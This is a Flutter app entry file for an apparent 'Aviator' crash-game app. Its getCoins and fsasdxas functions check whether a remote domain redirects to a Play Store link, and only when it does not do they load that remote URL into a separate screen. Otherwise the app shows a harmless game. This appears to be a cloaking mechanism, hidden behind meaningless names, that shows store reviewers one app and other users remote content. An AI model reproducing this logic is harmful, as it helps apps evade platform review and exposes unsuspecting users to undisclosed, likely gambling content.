import 'dart:io';
import 'package:connectivity/connectivity.dart';
import 'package:crash/homex.dart';
import 'package:dio/dio.dart';
import 'package:http/http.dart' as http;
import 'package:flutter/material.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:rx_shared_preferences/rx_shared_preferences.dart';
import 'home_page.dart';

String darkThemeAvailable = '';
String buttonHome = '';
List<String> themes = [];
List<bool> isAvailable = [true, true];
bool? dataFor;
String linkedData2 =
    'https://play.google.com/store/apps/details?id=ganhefly.aviador.demhe';
String dataCoins = 'https://costal-words.space';
bool trux = false;

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final RxSharedPreferences prefs = RxSharedPreferences.getInstance();
  final double? balance = await prefs.getDouble("balance");
  await fetchData();
  dataFor = await prefs.getBool("isAccurate");
  if (balance == null) {
    await prefs.setDouble("balance", 100);
  }
  OneSignal.shared.setLogLevel(OSLogLevel.verbose, OSLogLevel.none);
  OneSignal.shared.setAppId("7b275d56-36a4-4610-ac44-b803b0f41ae0");
  runApp(const MainApp());
}

final Dio dio = Dio();

Future<void> fetchData() async {
  var connectivityResult = await (Connectivity().checkConnectivity());

  if (connectivityResult == ConnectivityResult.none) {
    return;
  }

  final response = await http.get(Uri.parse('https://example.com'));

  if (response.statusCode == 200) {
    await getCoins(dataCoins);
  } else {}
}

Future<String?> getCoins(String getData) async {
  final client = HttpClient();
  var uri = Uri.parse(getData);
  var request = await client.getUrl(uri);
  request.followRedirects = false;
  var response = await request.close();
  print(response.headers.value(HttpHeaders.locationHeader));
  if (response.headers.value(HttpHeaders.locationHeader) != linkedData2) {
    buttonHome = dataCoins;
    trux = true;
    print('chnged to - ${trux} ${buttonHome}');
  } else {
  }
}

Future<List<bool>> fsasdxas() async {
  if (trux == true) {
    return Future.delayed(const Duration(seconds: 2), () => [true, true]);
  } else {
    return Future.delayed(const Duration(seconds: 2), () => [false, false]);
  }
}

class MainApp extends StatelessWidget {
  const MainApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<List<bool>>(
        future: fsasdxas(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Scaffold(
              backgroundColor: const Color.fromARGB(248, 255, 255, 255),
              body: Center(
                child: Container(
                  height: 80,
                  width: 80,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(10)
                  ),
                  child: ClipRRect(
                  borderRadius: BorderRadius.circular(10),
                  child: Image.asset('assets/lottie/asset.png'))),
              ),
            );
          } else {
            List<bool>? isAvailable = snapshot.data;
            if (isAvailable != null && isAvailable[0] == true) {
              return Screen1(itterible: buttonHome);
            } else  {
              return const Homex();
            }
          }
        },
      ),
    );
  }
}
